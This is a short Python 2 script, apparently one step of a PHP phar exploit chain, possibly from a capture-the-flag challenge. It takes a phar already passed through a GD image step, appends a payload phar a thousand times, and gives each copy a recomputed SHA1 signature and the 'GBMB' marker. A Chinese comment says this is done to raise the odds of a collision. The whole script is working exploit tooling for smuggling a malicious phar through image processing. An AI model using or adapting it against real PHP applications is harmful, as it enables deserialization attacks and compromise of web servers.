#!coding=utf8
from hashlib import sha1

origin = open("step2_gd2.phar","rb").read()
fixed = open("step3_fixed.phar","wb+")
payload = open("step1.phar","rb").read()



ptr = 1000*(28 + len(payload))
new_one = origin[:-ptr]
for i in range(1000): # 提升碰撞几率，产生1000此文件签名
    new_one +=  payload
    sha1o = sha1(new_one)
    sha1o = sha1o.hexdigest().decode('hex')
    new_one += sha1o
    new_one += '\x02\x00\x00\x00GBMB'
    ptr += 28 + len(payload)
print(len(new_one))
print(len(origin))
fixed.write(new_one)
